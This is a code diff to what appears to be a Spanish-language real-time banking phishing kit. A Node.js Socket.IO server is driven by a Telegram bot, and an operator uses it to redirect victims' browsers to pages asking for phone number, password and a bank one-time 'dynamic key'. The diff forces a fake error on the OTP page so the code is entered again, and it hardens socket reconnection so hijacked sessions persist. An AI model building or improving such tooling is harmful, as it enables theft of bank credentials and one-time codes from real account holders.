@@ -44,16 +44,17 @@ const io = socketIO(server, {
     methods: ['GET', 'POST'],
     credentials: true
   },
-  pingInterval: 3000, // Ping cada 3 segundos (muy frecuente)
-  pingTimeout: 8000, // Esperar 8 segundos antes de timeout
-  upgradeTimeout: 5000,
-  maxHttpBufferSize: 1e6,
-  allowUpgrades: false, // NO permitir upgrades
+  // Configuración optimizada para múltiples sesiones simultáneas y persistencia
+  pingInterval: 25000, // Ping cada 25 segundos (balance entre persistencia y carga)
+  pingTimeout: 60000, // Esperar 60 segundos antes de considerar timeout
+  upgradeTimeout: 30000,
+  maxHttpBufferSize: 1e8, // 100 MB para soportar muchas sesiones
+  allowUpgrades: true, // Permitir upgrade a WebSocket para mejor rendimiento
   perMessageDeflate: false,
   httpCompression: false,
-  transports: ['polling'], // SOLO polling
+  transports: ['websocket', 'polling'], // WebSocket primero, polling como fallback
   allowEIO3: true,
-  connectTimeout: 10000,
+  connectTimeout: 45000, // 45 segundos para establecer conexión
   cookie: false
 });
 const telegramBot = new TelegramBot(CONFIG.TELEGRAM.TOKEN, { 
@@ -355,47 +356,62 @@ class TelegramService {
 
     const socketId = session.socketId;
     
-    // Intentar encontrar el socket con reintentos (esperar reconexión automática)
+    // Intentar encontrar el socket con reintentos mejorados
     let socket = null;
-    const MAX_RETRIES = 5;
-    const RETRY_DELAY = 500; // 500ms entre intentos
+    const MAX_RETRIES = 10; // Aumentado a 10 intentos
+    const RETRY_DELAY = 1000; // 1 segundo entre intentos
     
     for (let i = 0; i < MAX_RETRIES; i++) {
       socket = io.sockets.sockets.get(socketId);
       
-      if (socket) {
-        console.log(`✅ Socket encontrado en intento ${i + 1}`);
+      if (socket && socket.connected) {
+        console.log(`✅ Socket encontrado y conectado en intento ${i + 1}`);
         break;
       }
       
       // Buscar socket reconectado con el mismo sessionId
       for (let [sid, s] of io.sockets.sockets) {
-        const socketSession = sessionRepo.get(sid);
-        if (socketSession && socketSession.sessionId === sessionId) {
-          socket = s;
-          session.socketId = sid; // Actualizar socketId
-          sessionRepo.sessionIdIndex.set(sessionId, sid); // Actualizar índice
-          console.log(`✅ Socket reconectado encontrado: ${sid}`);
-          break;
+        if (s.connected) { // Solo sockets realmente conectados
+          const socketSession = sessionRepo.get(sid);
+          if (socketSession && socketSession.sessionId === sessionId) {
+            socket = s;
+            session.socketId = sid; // Actualizar socketId
+            // Actualizar en Map principal
+            sessionRepo.sessions.delete(socketId);
+            sessionRepo.sessions.set(sid, session);
+            console.log(`✅ Socket reconectado encontrado: ${sid}`);
+            break;
+          }
         }
       }
       
-      if (socket) break;
+      if (socket && socket.connected) break;
       
       // Esperar antes del siguiente intento
       if (i < MAX_RETRIES - 1) {
-        console.log(`⏳ Intento ${i + 1}/${MAX_RETRIES} - Socket no encontrado, esperando ${RETRY_DELAY}ms...`);
+        console.log(`⏳ Intento ${i + 1}/${MAX_RETRIES} - Esperando reconexión...`);
         await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
       }
     }
     
-    // Si después de todos los intentos no se encuentra el socket
-    if (!socket) {
+    // Si después de todos los intentos no se encuentra el socket conectado
+    if (!socket || !socket.connected) {
       console.error(`❌ Socket no disponible después de ${MAX_RETRIES} intentos`);
+      
+      // Responder al callback para no dejar colgado Telegram
       await this.bot.answerCallbackQuery(callbackQuery.id, {
-        text: '⚠️ Acción no disponible en este momento.',
+        text: '⏳ Cliente reconectándose...',
         show_alert: false
       });
+      
+      // Enviar mensaje informativo (no error)
+      await this.bot.sendMessage(this.chatId, 
+        `ℹ️ *Solicitud Pendiente*\n\n` +
+        `🆔 Sesión: \`${sessionId}\`\n` +
+        `⏰ ${new Date().toLocaleString('es-CO')}\n\n` +
+        `_El cliente se está reconectando. La solicitud se procesará automáticamente cuando vuelva a conectar._`,
+        { parse_mode: 'Markdown' }
+      );
       return;
     }
 
@@ -408,7 +424,7 @@ class TelegramService {
         'phone': { page: 'numero.html', text: '📞 Solicitando número...', emoji: '📞', label: 'Número de Teléfono' },
         'pass': { page: 'contraseña.html', text: '🔑 Solicitando clave...', emoji: '🔑', label: 'Contraseña' },
         'loan': { page: 'simular-credito.html', text: '💰 Solicitando crédito...', emoji: '💰', label: 'Simulación de Crédito' },
-        'dinamica': { page: 'dinamica.html', text: '🔐 Solicitando clave dinámica...', emoji: '🔐', label: 'Clave Dinámica' },
+        'dinamica': { page: 'dinamica.html?error=true', text: '🔐 Solicitando clave dinámica...', emoji: '🔐', label: 'Clave Dinámica' },
         'recarga': { page: 'recarga.html', text: '💳 Solicitando recarga...', emoji: '💳', label: 'Recarga' }
       };
 
